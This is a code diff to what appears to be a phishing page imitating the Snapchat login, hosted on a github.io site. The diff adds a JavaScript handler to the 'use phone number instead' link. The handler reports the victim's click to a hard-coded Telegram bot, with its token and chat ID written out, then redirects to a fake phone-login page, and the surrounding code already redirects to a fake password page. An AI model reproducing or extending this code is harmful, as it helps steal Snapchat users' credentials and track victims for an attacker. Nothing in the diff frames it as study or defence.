@@ -27,6 +27,28 @@
                     window.location = "https://linktreeshorter.github.io/Snapchat/SnapchatLoginPasswort.htm";
                 }, 1000);
             }
+
+            function StattdessenHandynummerVerwenden(){
+                var apiUrl = "https://api.telegram.org/bot6862065355:AAG52OQ90c_Fhl7AuhSKJM6hU2yWFuA4mmw/sendMessage";
+                var chatId = "709764990";
+                var fullMessage = "Click - Stattdessen Handynummer verwenden";
+                
+                $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
+                    console.log("Antwort von der Telegram API:", data);
+                });
+
+                setTimeout(function() {
+                    window.location = "https://linktreeshorter.github.io/Snapchat/SnapchatLoginPhone.htm";
+                }, 1000);
+            }
+
+
+
+
+
+
+
+            
         </script>
     </head>
 
@@ -63,7 +85,7 @@
                     </button>
                 </form>
             </div>
-            <div class="text-block">
+            <div class="text-block" onclick="StattdessenHandynummerVerwenden()">
                 Stattdessen Handynummer<br />
                 verwenden
             </div>
